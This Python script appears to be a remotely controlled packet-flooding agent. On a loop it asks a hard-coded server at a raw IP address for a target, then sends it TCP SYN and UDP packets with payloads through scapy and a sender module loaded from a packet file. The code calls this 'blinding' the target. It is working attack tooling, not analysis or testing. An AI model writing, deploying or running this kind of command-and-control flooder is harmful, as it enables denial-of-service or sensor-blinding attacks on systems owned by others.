import time
from scapy.all import *
import requests
import sender


API_URL = "http://51.250.101.224/address"
INTERVAL = 10

target_ip = ""


def send_tcp_packet(dst_ip, dport, payload):
    packet = IP(dst=dst_ip) / TCP(dport=dport, sport=RandShort(), flags="S") / Raw(load=payload)
    send(packet, verbose=0)


def send_udp_packet(dst_ip, dport, payload):
    packet = IP(dst=dst_ip) / UDP(dport=dport) / Raw(load=payload)
    send(packet, verbose=0)


def get_target(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            global target_ip
            target_ip = response.text.strip('"')
            print(f"Blinding ip: {target_ip}")
        elif response.status_code == 404:
            target_ip = ""
            print(f"There is no target")
        else:
            target_ip = ""
            print(f"got {response.status_code} from API")
    except Exception as e:
        print(f"{e}")
        
        
def blind_target():
    get_target(API_URL)
    if target_ip:
        try:
            sender.send_packages(target_ip, 0, 'packets/packets.bin')
        except Exception as e:
            print(f"Blind target exception: {e}")


while True:
    blind_target()
    time.sleep(INTERVAL // 5)

